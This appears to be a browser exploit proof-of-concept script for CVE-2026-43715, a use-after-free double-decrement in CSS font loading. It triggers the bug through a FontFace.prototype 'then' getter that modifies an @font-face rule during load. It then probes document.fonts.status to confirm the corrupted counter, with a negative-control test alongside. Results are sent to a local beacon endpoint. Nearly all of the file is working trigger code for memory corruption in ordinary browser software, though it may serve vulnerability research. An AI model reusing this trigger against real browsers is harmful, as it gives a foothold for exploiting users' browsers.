// p453b-fontface-uaf-stateprobe.js — CVE-2026-43715 UAF double-decrement detection
//
// APPROACH: Use @font-face with url() src for probe (not JS FontFace constructor).
// CSS-created font faces always create CachedFontLoadRequest through CSSFontSelector.
//
// After UAF double-decrement: m_activeCount = UINT_MAX
// Loading probe font: incrementActiveCount(UINT_MAX→0), 0≠1, m_status stays Loaded
// → document.fonts.status = "loaded" while face.status = "loading"
// Normal: incrementActiveCount(0→1), m_status = Loading
// → document.fonts.status = "loading" while face.status = "loading"
//
// MISMATCH = PROOF of double-decrement.
(function() {
    var RUN = 'p453b-' + Date.now().toString(36);
    function B(tag, body) {
        try {
            var x = new XMLHttpRequest();
            x.open('POST', '/beacon/' + tag + '/' + RUN, false);
            x.send(typeof body === 'object' ? JSON.stringify(body) : (body || ''));
        } catch(e) {}
    }

    B('BOOT', navigator.userAgent);

    // ═══════════════════════════════════════════════════════════════
    // TEST A: Trigger UAF, then probe with @font-face url() font
    // ═══════════════════════════════════════════════════════════════
    try {
        // Create target face via @font-face (need CSS rule for CSSOM modify)
        var styleA = document.createElement('style');
        styleA.textContent = "@font-face { font-family: 'p453ba'; src: local('Arial'); }";
        document.head.appendChild(styleA);
        document.body.offsetHeight;

        var ruleA = styleA.sheet.cssRules[0];

        var faceA = null;
        document.fonts.forEach(function(f) {
            if (f.family.replace(/['"]/g,'') === 'p453ba') faceA = f;
        });

        if (!faceA) { B('A-DEAD', 'NO-FACE'); }
        else {
            var thenA = 0, aErr = '';

            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenA++;
                if (thenA > 1) return undefined;
                try {
                    ruleA.style.setProperty('font-weight', 'bold');
                    document.body.offsetHeight;

                    // Check status INSIDE getter (after remove/adopt)
                    B('A-INNER', {
                        fontsStatus: document.fonts.status,
                        faceStatus: faceA.status
                    });
                } catch(e) { aErr += e.message; }
                return undefined;
            }, configurable: true });

            faceA.load();
            try { delete FontFace.prototype.then; } catch(e) {}

            B('A-UAF', {
                thenFired: thenA,
                err: aErr,
                faceStatus: faceA.status,
                fontsStatus: document.fonts.status
            });

            // NOW: m_activeCount should be UINT_MAX (double-decrement)
            // Probe with CSS @font-face using url() src → stays Loading (async fetch)
            var probeStyle = document.createElement('style');
            // Use a URL that takes a long time to resolve
            // data: URL with invalid data should still go through CachedResourceLoader
            probeStyle.textContent = "@font-face { font-family: 'probeA'; src: url('/nonexistent-probe-p453ba.woff2'); }";
            document.head.appendChild(probeStyle);
            document.body.offsetHeight;

            // Find the probe face and load it
            var probeA = null;
            document.fonts.forEach(function(f) {
                if (f.family.replace(/['"]/g,'') === 'probeA') probeA = f;
            });

            if (!probeA) {
                B('A-NO-PROBE', 'probe face not in document.fonts');
            } else {
                var probeStatusPre = probeA.status;
                probeA.load();
                var probeStatusPost = probeA.status;
                var fontsStatusPost = document.fonts.status;

                var mismatch = (probeStatusPost === 'loading' && fontsStatusPost !== 'loading');

                B('A-PROBE', {
                    probeStatusPre: probeStatusPre,
                    probeStatusPost: probeStatusPost,
                    fontsStatus: fontsStatusPost,
                    mismatch: mismatch,
                    verdict: mismatch ? 'DOUBLE-DECREMENT-CONFIRMED' : 'NO-DETECT'
                });

                probeA.loaded.catch(function(){});
            }
        }
    } catch(e) { B('A-ERR', e.message.slice(0,200)); }


    // ═══════════════════════════════════════════════════════════════
    // TEST B: Negative control (no UAF) + same probe mechanism
    // ═══════════════════════════════════════════════════════════════
    try {
        // Create face WITHOUT UAF (no thenable getter)
        var styleB = document.createElement('style');
        styleB.textContent = "@font-face { font-family: 'p453bb'; src: local('Arial'); }";
        document.head.appendChild(styleB);
        document.body.offsetHeight;

        var faceB = null;
        document.fonts.forEach(function(f) {
            if (f.family.replace(/['"]/g,'') === 'p453bb') faceB = f;
        });

        if (faceB) {
            // Normal load (no UAF)
            faceB.load();

            // Probe with url() font
            var probeBStyle = document.createElement('style');
            probeBStyle.textContent = "@font-face { font-family: 'probeB'; src: url('/nonexistent-probe-p453bb.woff2'); }";
            document.head.appendChild(probeBStyle);
            document.body.offsetHeight;

            var probeB = null;
            document.fonts.forEach(function(f) {
                if (f.family.replace(/['"]/g,'') === 'probeB') probeB = f;
            });

            if (probeB) {
                probeB.load();
                B('B-CONTROL', {
                    probeFace: probeB.status,
                    fontsStatus: document.fonts.status,
                    mismatch: (probeB.status === 'loading' && document.fonts.status !== 'loading')
                });
                probeB.loaded.catch(function(){});
            } else {
                B('B-NO-PROBE', 'probe face not found');
            }
        } else {
            B('B-DEAD', 'NO-FACE');
        }
    } catch(e) { B('B-ERR', e.message.slice(0,200)); }


    // ═══════════════════════════════════════════════════════════════
    // TEST C: Try JS FontFace constructor with URL for comparison
    // ═══════════════════════════════════════════════════════════════
    try {
        var jsFace = new FontFace('jsProbe', "url('/nonexistent-probe-p453bc.woff2')");
        document.fonts.add(jsFace);
        var jsPre = jsFace.status;
        jsFace.load();
        var jsPost = jsFace.status;
        B('C-JSFONT', {
            preLoad: jsPre,
            postLoad: jsPost,
            fontsStatus: document.fonts.status
        });
        jsFace.loaded.catch(function(){});
    } catch(e) { B('C-ERR', e.message.slice(0,200)); }


    // ═══════════════════════════════════════════════════════════════
    // TEST D: Observable state changes from adopt
    // ═══════════════════════════════════════════════════════════════
    try {
        var sizeD0 = document.fonts.size;

        var styleD = document.createElement('style');
        styleD.textContent = "@font-face { font-family: 'p453bd'; src: local('Arial'); }";
        document.head.appendChild(styleD);
        document.body.offsetHeight;

        var sizeD1 = document.fonts.size;
        var ruleD = styleD.sheet.cssRules[0];

        var faceD = null;
        document.fonts.forEach(function(f) {
            if (f.family.replace(/['"]/g,'') === 'p453bd') faceD = f;
        });

        if (faceD) {
            var thenD = 0;
            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenD++;
                if (thenD > 1) return undefined;
                ruleD.style.setProperty('font-weight', 'bold');
                document.body.offsetHeight;
                return undefined;
            }, configurable: true });

            faceD.load();
            try { delete FontFace.prototype.then; } catch(e) {}

            B('D-ADOPT', {
                thenFired: thenD,
                sizeD0: sizeD0,
                sizeD1: sizeD1,
                sizeAfter: document.fonts.size,
                faceStatus: faceD.status,
                hasInSet: document.fonts.has(faceD)
            });
        } else {
            B('D-DEAD', 'NO-FACE');
        }
    } catch(e) { B('D-ERR', e.message.slice(0,200)); }


    B('ALIVE', 'all-tests-completed');
    B('DONE', RUN);
})();
